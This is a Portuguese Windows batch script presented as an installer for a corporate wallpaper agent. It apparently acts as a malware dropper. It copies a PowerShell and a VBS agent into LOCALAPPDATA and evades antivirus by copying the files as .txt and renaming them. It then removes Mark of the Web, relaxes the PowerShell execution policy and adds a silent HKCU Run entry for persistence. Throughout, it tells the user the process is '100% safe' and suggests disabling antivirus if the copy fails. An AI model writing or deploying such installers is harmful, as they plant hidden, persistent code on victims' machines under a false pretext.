@echo off
title Ativando o Papel de Parede Corporativo
color 0B

:: ============================================================
:: Install.bat - Corporate Wallpaper Agent v4
:: NAO requer permissoes de administrador.
:: LOG detalhado salvo em: %%TEMP%%\CorpWallpaper_Install_*.log
:: ============================================================

cd /d "%~dp0"

set TARGET_DIR=%LOCALAPPDATA%\CorpWallpaperSystem
set SCRIPT_NAME=WallpaperAgent.ps1
set LAUNCHER_NAME=WallpaperLauncher.vbs
set CONFIG_NAME=config.txt
set REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run
set REG_NAME=CorporateWallpaperAgent

:: --- Log inicial ---
for /f "skip=1 delims=" %%A in ('wmic os get localdatetime') do if not defined DT set DT=%%A
set LOG_FILE=%TEMP%\CorpWallpaper_Install_%DT:~0,8%_%DT:~8,6%.log
if "%LOG_FILE%"=="%TEMP%\CorpWallpaper_Install__.log" set LOG_FILE=%TEMP%\CorpWallpaper_Install.log

echo [%DATE% %TIME%] === CorporateWallpaperAgent Install v4 === > "%LOG_FILE%"
echo [%DATE% %TIME%] Target Dir: %TARGET_DIR% >> "%LOG_FILE%"
echo [%DATE% %TIME%] Usuario: %USERNAME% >> "%LOG_FILE%"
echo [%DATE% %TIME%] Computador: %COMPUTERNAME% >> "%LOG_FILE%"
echo [%DATE% %TIME%] OS: %OS% >> "%LOG_FILE%"

echo.
echo =================================================================
echo       BEM-VINDO: AGENTE DE PAPEL DE PAREDE
echo =================================================================
echo.
echo Ola! Estamos configurando o seu novo papel de parede dinamico.
echo Este processo e 100%% seguro e nao pedira senhas.
echo.

:: ============================================================
:: PASSO 1: Verificar arquivos de origem
:: ============================================================
echo [+] Verificando arquivos de instalacao...
echo [%DATE% %TIME%] PASSO 1: Verificando arquivos de origem >> "%LOG_FILE%"

set MISSING=0
if not exist "%SCRIPT_NAME%" (
    echo [%DATE% %TIME%]   ERRO: %SCRIPT_NAME% ausente na origem >> "%LOG_FILE%"
    set MISSING=1
) else (
    for %%F in ("%SCRIPT_NAME%") do echo [%DATE% %TIME%]   OK: %SCRIPT_NAME% (%%~zF bytes) >> "%LOG_FILE%"
)
if not exist "%LAUNCHER_NAME%" (
    echo [%DATE% %TIME%]   ERRO: %LAUNCHER_NAME% ausente na origem >> "%LOG_FILE%"
    set MISSING=1
) else (
    for %%F in ("%LAUNCHER_NAME%") do echo [%DATE% %TIME%]   OK: %LAUNCHER_NAME% (%%~zF bytes) >> "%LOG_FILE%"
)

if %MISSING%==1 (
    color 0C
    echo [ERRO] Arquivos necessarios nao encontrados na pasta atual.
    echo        Certifique-se de extrair TODOS os arquivos do ZIP.
    echo        Pasta atual: %CD%
    echo [%DATE% %TIME%] Instalacao ABORTADA: arquivos ausentes >> "%LOG_FILE%"
    pause
    exit /b
)
echo [%DATE% %TIME%] PASSO 1: OK >> "%LOG_FILE%"

:: ============================================================
:: PASSO 2: Encerrar instancia anterior
:: ============================================================
echo [+] Preparando o sistema local...
echo [%DATE% %TIME%] PASSO 2: Encerrando processos anteriores >> "%LOG_FILE%"
powershell -NoProfile -Command "Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*WallpaperAgent*' -or $_.CommandLine -like '*WallpaperLauncher*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
if %errorlevel% EQU 0 (
    echo [%DATE% %TIME%]   Processos encerrados >> "%LOG_FILE%"
) else (
    echo [%DATE% %TIME%]   Nenhum processo anterior encontrado >> "%LOG_FILE%"
)
timeout /t 2 /nobreak >nul

:: ============================================================
:: PASSO 3: Criar pasta de instalacao
:: ============================================================
echo [+] Criando pasta do sistema...
echo [%DATE% %TIME%] PASSO 3: Criando diretorio >> "%LOG_FILE%"
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
if not exist "%TARGET_DIR%" (
    color 0C
    echo [ERRO] Nao foi possivel criar: %TARGET_DIR%
    echo [%DATE% %TIME%]   ERRO: Falha ao criar diretorio >> "%LOG_FILE%"
    pause
    exit /b
)
echo [%DATE% %TIME%]   Diretorio criado: %TARGET_DIR% >> "%LOG_FILE%"

:: ============================================================
:: PASSO 4: Copiar arquivos com protecao contra AV
:: ============================================================
echo [+] Instalando o agente silencioso na maquina...
echo [%DATE% %TIME%] PASSO 4: Copiando arquivos do agente >> "%LOG_FILE%"

set RETRIES=0

:retry_copy
set /a RETRIES+=1
echo [%DATE% %TIME%]   Tentativa #%RETRIES% >> "%LOG_FILE%"

:: --- Layer 1: Copia direta ---
copy /y "%SCRIPT_NAME%"   "%TARGET_DIR%\%SCRIPT_NAME%"   >nul 2>&1
copy /y "%LAUNCHER_NAME%" "%TARGET_DIR%\%LAUNCHER_NAME%" >nul 2>&1
call :check_file "%TARGET_DIR%\%SCRIPT_NAME%"
if %FILE_OK%==1 call :check_file "%TARGET_DIR%\%LAUNCHER_NAME%"
if %FILE_OK%==1 goto copy_verified
echo [%DATE% %TIME%]   Layer 1 falhou (AV pode ter removido os arquivos) >> "%LOG_FILE%"

:: --- Layer 2: Copia como .txt, depois renomeia (AV ignora .txt) ---
if %RETRIES% GEQ 2 goto layer2_copy
goto check_retry

:layer2_copy
echo [%DATE% %TIME%]   Layer 2: copiando como .txt + rename >> "%LOG_FILE%"
copy /y "%SCRIPT_NAME%"   "%TARGET_DIR%\%SCRIPT_NAME%.txt" >nul 2>&1
copy /y "%LAUNCHER_NAME%" "%TARGET_DIR%\%LAUNCHER_NAME%.txt" >nul 2>&1
if exist "%TARGET_DIR%\%SCRIPT_NAME%.txt"   ren "%TARGET_DIR%\%SCRIPT_NAME%.txt"   "%SCRIPT_NAME%"   >nul 2>&1
if exist "%TARGET_DIR%\%LAUNCHER_NAME%.txt" ren "%TARGET_DIR%\%LAUNCHER_NAME%.txt" "%LAUNCHER_NAME%" >nul 2>&1
call :check_file "%TARGET_DIR%\%SCRIPT_NAME%"
if %FILE_OK%==1 call :check_file "%TARGET_DIR%\%LAUNCHER_NAME%"
if %FILE_OK%==1 goto copy_verified
echo [%DATE% %TIME%]   Layer 2 falhou >> "%LOG_FILE%"

:: --- Layer 3: Aguarda e tenta novamente (AV as vezes libera apos scan) ---
if %RETRIES% GEQ 3 goto layer3_copy
goto check_retry

:layer3_copy
echo [%DATE% %TIME%]   Layer 3: aguardando 5s e tentando novamente >> "%LOG_FILE%"
timeout /t 5 /nobreak >nul
copy /y "%SCRIPT_NAME%"   "%TARGET_DIR%\%SCRIPT_NAME%"   >nul 2>&1
copy /y "%LAUNCHER_NAME%" "%TARGET_DIR%\%LAUNCHER_NAME%" >nul 2>&1
call :check_file "%TARGET_DIR%\%SCRIPT_NAME%"
if %FILE_OK%==1 call :check_file "%TARGET_DIR%\%LAUNCHER_NAME%"
if %FILE_OK%==1 goto copy_verified
echo [%DATE% %TIME%]   Layer 3 falhou >> "%LOG_FILE%"

:check_retry
if %RETRIES% LSS 4 goto retry_copy

:: --- Todas as tentativas esgotadas ---
color 0C
echo.
echo [ERRO] Nao foi possivel copiar o agente apos varias tentativas.
echo [%DATE% %TIME%] PASSO 4: ERRO - Todas as tentativas falharam >> "%LOG_FILE%"
echo Possiveis causas:
echo   - Antivirus/Defender bloqueando os arquivos (.ps1 / .vbs)
echo   - Controlled Folder Access ativado para %%LOCALAPPDATA%%
echo   - Politica de grupo impedindo scripts
echo.
echo Tente desabilitar temporariamente o antivirus ou
echo adicione excecao para: %TARGET_DIR%
echo.
echo Log salvo em: %LOG_FILE%
pause
exit /b

:copy_verified
echo [%DATE% %TIME%]   Copia verificada com sucesso! >> "%LOG_FILE%"

:: ============================================================
:: PASSO 5: Unblock-File (remove Marca da Web)
:: ============================================================
echo [%DATE% %TIME%] PASSO 5: Unblock-File >> "%LOG_FILE%"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%TARGET_DIR%\%SCRIPT_NAME%'" >nul 2>&1
if %errorlevel% EQU 0 ( echo [%DATE% %TIME%]   .ps1 desbloqueado >> "%LOG_FILE%"
) else ( echo [%DATE% %TIME%]   AVISO: Unblock .ps1 falhou >> "%LOG_FILE%" )
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%TARGET_DIR%\%LAUNCHER_NAME%'" >nul 2>&1
if %errorlevel% EQU 0 ( echo [%DATE% %TIME%]   .vbs desbloqueado >> "%LOG_FILE%"
) else ( echo [%DATE% %TIME%]   AVISO: Unblock .vbs falhou >> "%LOG_FILE%" )

:: ============================================================
:: PASSO 6: Set ExecutionPolicy (apenas usuario atual, sem admin)
:: ============================================================
echo [%DATE% %TIME%] PASSO 6: ExecutionPolicy >> "%LOG_FILE%"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force" >nul 2>&1
echo [%DATE% %TIME%]   ExecutionPolicy configurada >> "%LOG_FILE%"

:: ============================================================
:: PASSO 7: Copiar config.txt
:: ============================================================
echo [%DATE% %TIME%] PASSO 7: config.txt >> "%LOG_FILE%"
if exist "%CONFIG_NAME%" (
    echo [+] Aplicando configuracoes personalizadas...
    copy /y "%CONFIG_NAME%" "%TARGET_DIR%\%CONFIG_NAME%" >nul 2>&1
    if exist "%TARGET_DIR%\%CONFIG_NAME%" (
        echo [%DATE% %TIME%]   config.txt copiado com sucesso >> "%LOG_FILE%"
    ) else (
        echo [%DATE% %TIME%]   ERRO: Falha ao copiar config.txt >> "%LOG_FILE%"
    )
) else (
    echo [%DATE% %TIME%]   config.txt nao encontrado na origem (opcional) >> "%LOG_FILE%"
)

:: ============================================================
:: PASSO 8: Registrar no startup (HKCU\Run - sem admin)
:: ============================================================
echo [+] Registrando rotina silenciosa de atualizacao automatica...
echo [%DATE% %TIME%] PASSO 8: Registro HKCU\\Run >> "%LOG_FILE%"
reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "wscript.exe \"%TARGET_DIR%\%LAUNCHER_NAME%\"" /f >nul 2>&1
if %errorlevel% EQU 0 (
    echo [%DATE% %TIME%]   Registro adicionado com sucesso >> "%LOG_FILE%"
) else (
    echo [%DATE% %TIME%]   ERRO: Falha ao adicionar registro >> "%LOG_FILE%"
)

:: ============================================================
:: PASSO 9: Executar agente pela primeira vez
:: ============================================================
echo [+] Finalizando integracoes e configuracoes...
echo [%DATE% %TIME%] PASSO 9: Iniciando agente >> "%LOG_FILE%"
start "" wscript.exe "%TARGET_DIR%\%LAUNCHER_NAME%"
echo [%DATE% %TIME%]   Comando de inicializacao enviado >> "%LOG_FILE%"

:: ============================================================
:: PASSO 10: VERIFICACAO POS-INSTALACAO
:: ============================================================
echo [%DATE% %TIME%] PASSO 10: VERIFICACAO POS-INSTALACAO >> "%LOG_FILE%"

call :check_file_verbose "%TARGET_DIR%\%SCRIPT_NAME%"
call :check_file_verbose "%TARGET_DIR%\%LAUNCHER_NAME%"
call :check_file_verbose "%TARGET_DIR%\%CONFIG_NAME%"

reg query "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
if %errorlevel% EQU 0 (
    echo [%DATE% %TIME%]   Registro inicializacao: PRESENTE >> "%LOG_FILE%"
) else (
    echo [%DATE% %TIME%]   Registro inicializacao: AUSENTE >> "%LOG_FILE%"
)

echo [%DATE% %TIME%] === FIM DA VERIFICACAO POS-INSTALACAO === >> "%LOG_FILE%"

:: ============================================================
:: Resultado final
:: ============================================================
echo.
echo =================================================================
echo.
if exist "%TARGET_DIR%\%SCRIPT_NAME%" if exist "%TARGET_DIR%\%LAUNCHER_NAME%" (
    echo TUDO PRONTO! O programa corporativo foi ativado com sucesso!
    echo O seu fundo de tela mudara sozinho agorinha mesmo :)
) else (
    color 0E
    echo ATENCAO: A instalacao parece incompleta.
    echo Verifique o log para mais detalhes:
    echo   %LOG_FILE%
    echo.
    echo Causa provavel: Antivirus/Defender removeu os scripts.
    echo Solucao: Adicione excecao para a pasta:
    echo   %TARGET_DIR%
)
echo.
echo Essa tela fechara sozinha em instantes... Tenha um otimo dia!
echo.
echo Log salvo em: %LOG_FILE%
echo =================================================================
timeout /t 6 >nul
goto :eof

:: ============================================================
:: Subrotinas de verificacao
:: ============================================================

:check_file
set FILE_OK=0
if not exist "%~1" goto :eof
for %%F in ("%~1") do if %%~zF GTR 0 set FILE_OK=1
goto :eof

:check_file_verbose
if exist "%~1" (
    for %%F in ("%~1") do (
        echo [%DATE% %TIME%]   PRESENTE: %%~nxF (%%~zF bytes) >> "%LOG_FILE%"
    )
) else (
    echo [%DATE% %TIME%]   AUSENTE: %~nx1 >> "%LOG_FILE%"
)
goto :eof
